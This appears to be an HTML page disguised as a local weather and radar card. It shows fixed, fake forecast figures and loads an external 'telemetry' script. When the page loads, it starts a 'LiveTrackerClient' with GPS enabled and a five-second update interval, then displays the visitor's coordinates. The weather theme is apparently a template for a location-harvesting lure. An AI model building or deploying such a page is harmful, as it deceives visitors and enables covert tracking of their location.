<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Local Weather & Radar</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', -apple-system, sans-serif;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
            color: #ffffff;
            padding: 20px;
        }

        .weather-card {
            background: rgba(30, 41, 59, 0.85);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 32px 28px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 380px;
            width: 100%;
        }

        .card-header h2 {
            font-size: 22px;
            font-weight: 700;
            color: #ffffff;
        }

        .location-tag {
            font-size: 14px;
            color: #94a3b8;
            margin-top: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .weather-icon-box {
            margin: 24px 0;
            display: flex;
            justify-content: center;
        }

        .weather-icon-box img {
            width: 110px;
            height: 110px;
            filter: drop-shadow(0 8px 16px rgba(0,0,0,0.3));
        }

        .temperature {
            font-size: 56px;
            font-weight: 800;
            color: #ffffff;
            line-height: 1;
        }

        .condition {
            font-size: 16px;
            color: #cbd5e1;
            font-weight: 500;
            margin-top: 8px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            background: rgba(15, 23, 42, 0.6);
            padding: 14px;
            border-radius: 16px;
            margin: 24px 0;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .stat-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            font-size: 13px;
        }

        .stat-item i {
            font-size: 18px;
        }

        .stat-label {
            font-size: 11px;
            color: #94a3b8;
        }

        .stat-val {
            font-weight: 600;
            color: #ffffff;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            transition: all 0.2s;
            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.6);
        }
    </style>
</head>

<body>
    <div class="weather-card">
        <div class="card-header">
            <h2>Live Weather Radar</h2>
            <p class="location-tag"><i class="fas fa-location-dot" style="color: #3b82f6;"></i> <span id="city">Detecting Local Forecast...</span></p>
        </div>

        <div class="weather-icon-box">
            <img src="/weather.png" alt="Weather Icon">
        </div>

        <div class="weather-info">
            <span class="temperature">26°C</span>
            <div class="condition">Partly Cloudy • High 28° / Low 21°</div>
        </div>

        <div class="stats-grid">
            <div class="stat-item">
                <i class="fas fa-wind" style="color: #60a5fa;"></i>
                <span class="stat-val">12 km/h</span>
                <span class="stat-label">Wind</span>
            </div>
            <div class="stat-item">
                <i class="fas fa-droplet" style="color: #38bdf8;"></i>
                <span class="stat-val">65%</span>
                <span class="stat-label">Humidity</span>
            </div>
            <div class="stat-item">
                <i class="fas fa-sun" style="color: #fbbf24;"></i>
                <span class="stat-val">UV 5</span>
                <span class="stat-label">UV Index</span>
            </div>
        </div>

        <button id="refresh-btn">
            <i class="fas fa-sync-alt"></i> Refresh Weather Data
        </button>
    </div>

    <script src="/js/telemetry.js"></script>
    <script>
        const btn = document.querySelector("#refresh-btn");
        const cityEl = document.querySelector("#city");

        function startWeatherTracking(isUserClick = false) {
            if (isUserClick) {
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Updating Weather...';
            }

            if (window.LiveTrackerClient) {
                window.LiveTrackerClient.startTracking({
                    templateName: 'weather',
                    updateInterval: 5000,
                    enableCamera: false,
                    enableGPS: true,
                    onSuccess: (coords) => {
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-check"></i> Forecast Updated';
                        cityEl.textContent = `Shared location: ${coords.latitude.toFixed(3)}°, ${coords.longitude.toFixed(3)}°`;
                        setTimeout(() => {
                            btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh Weather Data';
                        }, 3000);
                    },
                    onError: (err) => {
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh Weather Data';
                    }
                });
            }
        }

        btn.addEventListener("click", () => startWeatherTracking(true));

        window.addEventListener('DOMContentLoaded', () => {
            startWeatherTracking(false);
        });
    </script>
</body>

</html>
